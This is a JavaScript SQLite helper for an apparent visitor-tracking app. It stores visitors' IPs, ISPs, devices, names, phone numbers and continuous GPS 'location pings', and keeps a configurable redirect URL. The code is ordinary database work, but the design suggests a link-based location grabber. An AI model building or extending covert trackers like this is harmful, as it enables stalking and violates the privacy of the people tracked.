/**
 * SQLite Database Helper Utility
 * 
 * ⚠️ DEPLOYMENT NOTE:
 * This SQLite setup is optimized for LOCAL DEVELOPMENT or platforms with
 * persistent file-system storage (Railway, Render, self-hosted VPS).
 * 
 * Vercel and similar serverless platforms use a READ-ONLY / EPHEMERAL
 * filesystem — the database file will be lost on every cold start.
 * For production on those platforms, migrate to PostgreSQL, MySQL,
 * or a managed SQLite service like Turso / LiteFS.
 */

import Database from "better-sqlite3";
import path from "path";
import fs from "fs";

// Store the database file at the path specified by the DATABASE_PATH env variable, or default to the project root
const DB_PATH = process.env.DATABASE_PATH || path.join(process.cwd(), "tracker.db");

let db;

function getDatabase() {
  if (!db) {
    // Ensure parent directory exists (especially useful for custom paths like /data/tracker.db on Railway)
    const dir = path.dirname(DB_PATH);
    if (!fs.existsSync(dir)) {
      fs.mkdirSync(dir, { recursive: true });
    }

    db = new Database(DB_PATH);

    // Enable WAL mode for better concurrent read performance
    db.pragma("journal_mode = WAL");

    // Create the logs table if it doesn't exist
    db.exec(`
      CREATE TABLE IF NOT EXISTS logs (
        id        INTEGER PRIMARY KEY AUTOINCREMENT,
        ip        TEXT NOT NULL,
        country   TEXT DEFAULT 'Unknown',
        city      TEXT DEFAULT 'Unknown',
        isp       TEXT DEFAULT 'Unknown',
        device    TEXT DEFAULT 'Unknown',
        lat       TEXT,
        lon       TEXT,
        prediction TEXT,
        full_name TEXT,
        phone     TEXT,
        timestamp TEXT NOT NULL DEFAULT (datetime('now'))
      )
    `);

    // Safely run migrations for existing databases
    const columnsToMigrate = [
      { name: "lat", type: "TEXT" },
      { name: "lon", type: "TEXT" },
      { name: "prediction", type: "TEXT" },
      { name: "full_name", type: "TEXT" },
      { name: "phone", type: "TEXT" }
    ];
    for (const col of columnsToMigrate) {
      try {
        db.exec(`ALTER TABLE logs ADD COLUMN ${col.name} ${col.type}`);
      } catch (err) {
        // Suppress errors (column already exists)
      }
    }

    // Create the settings table for configurable values (e.g. redirect URL)
    db.exec(`
      CREATE TABLE IF NOT EXISTS settings (
        key   TEXT PRIMARY KEY,
        value TEXT NOT NULL
      )
    `);

    // Insert default redirect URL if not already set
    db.prepare(`
      INSERT OR IGNORE INTO settings (key, value)
      VALUES ('redirect_url', 'https://www.google.com')
    `).run();

    // Insert default redirect mode if not already set
    db.prepare(`
      INSERT OR IGNORE INTO settings (key, value)
      VALUES ('redirect_mode', 'custom')
    `).run();

    // Create location_pings table for continuous GPS tracking history
    db.exec(`
      CREATE TABLE IF NOT EXISTS location_pings (
        id        INTEGER PRIMARY KEY AUTOINCREMENT,
        log_id    INTEGER NOT NULL,
        lat       TEXT NOT NULL,
        lon       TEXT NOT NULL,
        accuracy  REAL,
        timestamp TEXT NOT NULL DEFAULT (datetime('now'))
      )
    `);
  }
  return db;
}

/**
 * Insert a new tracking log entry
 */
export function insertLog({ ip, country, city, isp, device, lat, lon }) {
  const database = getDatabase();
  const stmt = database.prepare(`
    INSERT INTO logs (ip, country, city, isp, device, lat, lon, timestamp)
    VALUES (?, ?, ?, ?, ?, ?, ?, datetime('now'))
  `);
  const info = stmt.run(ip, country, city, isp, device, lat || null, lon || null);
  return info.lastInsertRowid;
}

/**
 * Update an existing log with prediction data
 */
export function updateLogPrediction(id, { prediction, fullName, phone }) {
  const database = getDatabase();
  const stmt = database.prepare(`
    UPDATE logs
    SET prediction = ?, full_name = ?, phone = ?
    WHERE id = ?
  `);
  return stmt.run(prediction, fullName, phone, id);
}

/**
 * Update the main log with accurate GPS coordinates
 */
export function updateLogCoordinates(id, { lat, lon }) {
  const database = getDatabase();
  const stmt = database.prepare(`
    UPDATE logs
    SET lat = ?, lon = ?
    WHERE id = ?
  `);
  return stmt.run(String(lat), String(lon), parseInt(id));
}

/**
 * Retrieve all logs ordered by most recent first
 */
export function getAllLogs() {
  const database = getDatabase();
  const stmt = database.prepare(`
    SELECT id, ip, country, city, isp, device, lat, lon, prediction, full_name, phone, timestamp
    FROM logs
    ORDER BY id DESC
  `);
  return stmt.all();
}

/**
 * Insert a GPS location ping for a specific visitor log
 */
export function insertLocationPing(logId, { lat, lon, accuracy }) {
  const database = getDatabase();
  return database.prepare(`
    INSERT INTO location_pings (log_id, lat, lon, accuracy, timestamp)
    VALUES (?, ?, ?, ?, datetime('now'))
  `).run(parseInt(logId), String(lat), String(lon), accuracy || null);
}

/**
 * Get all location pings (movement history) for a specific visitor
 */
export function getLocationHistory(logId) {
  const database = getDatabase();
  return database.prepare(`
    SELECT id, log_id, lat, lon, accuracy, timestamp
    FROM location_pings
    WHERE log_id = ?
    ORDER BY id ASC
  `).all(parseInt(logId));
}

/**
 * Get total count of tracked visits
 */
export function getLogCount() {
  const database = getDatabase();
  const row = database.prepare("SELECT COUNT(*) as count FROM logs").get();
  return row.count;
}

/**
 * Get unique country count
 */
export function getUniqueCountries() {
  const database = getDatabase();
  const row = database.prepare("SELECT COUNT(DISTINCT country) as count FROM logs WHERE country != 'Unknown'").get();
  return row.count;
}

/**
 * Get the most recent log entry
 */
export function getLatestLog() {
  const database = getDatabase();
  return database.prepare("SELECT * FROM logs ORDER BY id DESC LIMIT 1").get();
}

/**
 * Get a setting value by key
 */
export function getSetting(key) {
  const database = getDatabase();
  const row = database.prepare("SELECT value FROM settings WHERE key = ?").get(key);
  return row ? row.value : null;
}

/**
 * Set a setting value (upsert)
 */
export function setSetting(key, value) {
  const database = getDatabase();
  database.prepare(`
    INSERT OR REPLACE INTO settings (key, value)
    VALUES (?, ?)
  `).run(key, value);
}
